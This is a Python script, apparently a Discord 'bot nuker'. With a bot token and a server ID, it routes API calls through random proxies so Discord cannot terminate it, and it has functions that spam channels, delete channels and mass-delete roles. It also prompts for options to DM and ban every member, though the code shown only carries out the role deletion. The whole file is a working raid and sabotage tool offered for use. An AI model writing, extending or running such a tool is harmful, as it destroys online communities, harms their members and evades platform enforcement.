import requests
import colorama
from concurrent.futures import ThreadPoolExecutor, as_completed
import random
import time

def get_proxies():
    with open("proxies.txt", 'r') as file:
        proxies = []
        for line in file:
            stripped_line = line.strip()
            if not stripped_line.startswith('#'):
                proxies.append(stripped_line)
        return proxies

def send_message(token, proxy, message, channelid):
    try:
        response = requests.post(f"https://discord.com/api/v9/channels/{channelid}/messages", proxies={"http": proxy, "https": proxy}, headers={'Authorization': f'Bot {token}','Content-Type': 'application/json',}, json={'content': message})
        if response.status_code == 200:
            print(f"Sent message to channel {channelid}")
        else:
            print(colorama.Fore.RED + f"Bot is being rate limited. Waiting then trying again.")
            time.sleep(1)
            send_message(token, proxy, message, channelid)
    except requests.exceptions.ProxyError:
        print(colorama.Fore.RED + f"Proxy {proxy} failed.")
    except requests.exceptions.ReadTimeout:
        print(colorama.Fore.RED + f"Proxy {proxy} Timed out.")
    except:
        print(colorama.Fore.RED + f"Unkown Error: {proxy}")

def delete_channel(token, proxy, channelid):
    try:
        response = requests.delete(f"https://discord.com/api/v9/channels/{channelid}", proxies={"http": proxy, "https": proxy}, headers={'Authorization': f'Bot {token}'})
        if response.status_code == 204:
            print(f"Deleted channel {channelid}")
        else:
            print(colorama.Fore.RED + f"Bot is being rate limited. Waiting then trying again.")
            time.sleep(1)
            delete_channel(token, proxy, channelid)
    except requests.exceptions.ProxyError:
        print(colorama.Fore.RED + f"Proxy {proxy} failed.")
    except requests.exceptions.ReadTimeout:
        print(colorama.Fore.RED + f"Proxy {proxy} Timed out.")
    except:
        print(colorama.Fore.RED + f"Unkown Error: {proxy}")

def delete_role(token, proxy, roleid, guildid, proxylist):
    try:
        response = requests.delete(f"https://discord.com/api/v9/guilds/{guildid}/roles/{roleid}", proxies={"http": proxy, "https": proxy}, headers={'Authorization': f'Bot {token}'}, timeout=3)
        if response.status_code == 200 or response.status_code == 204:
            print(colorama.Fore.RESET + f"Deleted Role {roleid}")
            return
        else:
            print(colorama.Fore.RED + f"Bot is being rate limited, trying again in 1 second.")
            time.sleep(1)
            delete_role(token, proxy, roleid, guildid, proxylist)
    except requests.exceptions.ProxyError:
        print(colorama.Fore.RED + f"Proxy {proxy} failed. Trying with a different one.")
        proxy = random.choice(proxylist)
        delete_role(token, proxy, roleid, guildid, proxylist)
    except requests.exceptions.ReadTimeout:
        print(colorama.Fore.RED + f"Proxy {proxy} Timed out. Trying with a different one.")
        proxy = random.choice(proxylist)
        delete_role(token, proxy, roleid, guildid, proxylist)
    except:
        print(colorama.Fore.RED + f"Unkown Error: {proxy}. Trying with a different one.")
        proxy = random.choice(proxylist)
        delete_role(token, proxy, roleid, guildid, proxylist)

def bot_nuker_helper():
    print(colorama.Fore.RED + "To prevent discord terminations it is not optional to use proxies for bot nuker. You can google ""free proxies"" to get free proxies.")
    proxylist = get_proxies()
    if not proxylist:
        print(colorama.Fore.RED + "ERROR: NO PROXIES IN PROXIES.TXT")
    token = input(colorama.Fore.RESET + "Token: ")
    response = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": f"Bot {token}"})
    if response.status_code != 200:
        print(colorama.Fore.RED + "Invalid Token.\n")
        return
    else:
        botid = response.json()['id']    
    guildid = input("Discord Server ID: ")
    number_of_roles = int(input("Number of roles to create: "))
    role_names = input("Name of roles to create: ")
    number_of_channels = int(input("Number of channels to create: "))
    channel_names = input("Name of channels to create: ")
    number_of_messages = int(input("Number of times to send message in each channel: "))
    spam_message = input("Message to spam: ")
    dm_members = input("DM all members? (Y/N): ")
    if dm_members.lower().strip() == "y":
        dm_message = input("Message to DM members: ")
    ban_members = input("Ban all members? (Y/N): ")
    max_threads = int(input("Max Threads (more threads = faster but harder on pc): "))

    response = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/members/{botid}", headers={'Authorization': f'Bot {token}'})
    bot_roles = response.json().get('roles', [])

    response = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/roles", headers={'Authorization': f'Bot {token}'})
    roles = response.json()

    highest_position = 0
    for role in roles:
        if role['id'] in bot_roles and role['position'] > highest_position:
            highest_position = role['position']
    roles_without_everyone = [role for role in roles if role['name'] != '@everyone']
    roles_below_bot = [role for role in roles_without_everyone if role['position'] < highest_position]
    if not roles_without_everyone:
        print(colorama.Fore.RED + "The server has no roles that can be deleted.")
    else:
        print("Deleting roles...")
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = []
            for roleid in roles:
                proxy = random.choice(proxylist)
                futures.append(executor.submit(delete_role, token, proxy, roleid['id'], guildid, proxylist))
            
            for future in as_completed(futures):
                future.result()

    return